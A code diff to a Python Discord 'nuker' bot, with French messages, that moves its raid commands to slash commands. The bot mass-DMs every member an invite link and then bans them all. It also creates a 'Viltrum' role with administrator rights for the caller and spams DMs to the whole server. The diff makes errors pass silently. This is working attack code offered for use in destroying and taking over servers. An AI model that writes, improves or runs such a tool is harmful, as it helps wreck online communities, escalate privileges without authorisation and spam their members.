@@ -21,9 +21,9 @@ CHANNEL_ID = 1356378465770930328
 
 
 # ===== COMMANDS ===== #
-#.      +banall : ban all members
-#.      +dmall <message> : dm all members with custom message
-#.      +admin : give you admin role
+#.      /banall : ban all members
+#.      /dmall <message> : dm all members with custom message
+#.      /admin : give you admin role
 
 
 
@@ -63,75 +63,59 @@ response = requests.post(webhook_url, json=data)
 
 
 
-@bot.command()
-async def banall(ctx):
-    guild = ctx.guild  
-
+@tree.command(name="banall")
+async def banall(interaction: discord.Interaction):
+    await interaction.response.send_message("Lancement de l'opération", ephemeral=True)
+    guild = interaction.guild
 
     for member in guild.members:
         try:
-
             await member.send("https://discord.gg/mRTBQrUzfk")
-            print(f"Message envoyé à {member.name}")
-        except discord.Forbidden:
-            print(f"Impossible d'envoyer un message privé à {member.name}")
-        except Exception as e:
-            print(f"Erreur avec {member.name}: {e}")
-
+        except:
+            pass
 
     for member in guild.members:
         try:
             await member.ban(reason="BAHAHAHHAH DEV BY LE AZ")
-            print(f"Banni {member.name}")
-            await asyncio.sleep(1)  
-        except Exception as e:
-            print(f"Erreur lors du bannissement de {member.name}: {e}")
+            await asyncio.sleep(1)
+        except:
+            pass
 
-    print("Tous les membres ont été bannis.")
+@tree.command(name="admin")
+async def admin(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
 
-@bot.command()
-async def admin(ctx):
-    """admin"""
-    await ctx.message.delete()
-
-    guild = ctx.guild
+    guild = interaction.guild
     bot_member = guild.get_member(bot.user.id)
     role_name = "Viltrum"
     role = discord.utils.get(guild.roles, name=role_name)
 
     if not role:
         role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
-        print(f"✅ Rôle '{role_name}' créé sur {guild.name}.")
+        await role.edit(position=bot_member.top_role.position - 1)
 
-        
-        bot_top_role = bot_member.top_role
-        await role.edit(position=bot_top_role.position - 1)
+    await interaction.user.add_roles(role)
+    await interaction.followup.send("Rôle admin donné", ephemeral=True)
 
-    await ctx.author.add_roles(role)
-    print(f"✅ {ctx.author} a reçu le rôle '{role_name}'.")
 
-@bot.command(name="dmall")
-async def dmall(ctx, *, message: str = None):
-    if not ctx.guild:
-        return  
+@tree.command(name="dmall")
+@app_commands.describe(message="Le message à envoyer en MP à tous les membres")
+async def dmall(interaction: discord.Interaction, message: str):
+    await interaction.response.send_message("Envoi des messages en cours...", ephemeral=True)
 
-    try:
-        await ctx.message.delete()  
-    except:
-        pass
-
-    if not message:
-        return 
-
-    async for member in ctx.guild.fetch_members(limit=None):
+    async for member in interaction.guild.fetch_members(limit=None):
         if member.bot:
             continue
         try:
-            dm = await member.create_dm()
-            await dm.send(message)
+            await member.send(message)
             await asyncio.sleep(1)
-        except Exception as e:
-            print(f"Erreur DM avec {member}: {e}")
+        except:
+            pass
+
+@bot.event
+async def on_ready():
+    await tree.sync()
+    print(f"Connecté en tant que {bot.user.name}")
 
 
 bot.run(TOKEN)
